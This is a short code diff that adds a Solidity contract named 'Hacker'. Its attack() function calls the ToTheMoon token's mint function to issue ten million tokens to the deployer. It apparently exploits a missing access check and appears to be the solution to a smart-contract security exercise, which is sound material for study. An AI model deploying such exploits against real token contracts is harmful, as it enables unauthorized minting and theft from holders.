@@ -34,3 +34,19 @@ contract ToTheMoon is ERC20Pausable {
         }
     }
 }
+
+contract Hacker {
+
+    ToTheMoon token; 
+    address payable owner;
+    uint amount = 10000000 * 1e18;
+
+    constructor(address _token) {
+        token = ToTheMoon(_token);
+        owner = payable(msg.sender);
+    }
+
+    function attack() external {
+        token.mint(owner, amount);
+    }
+}
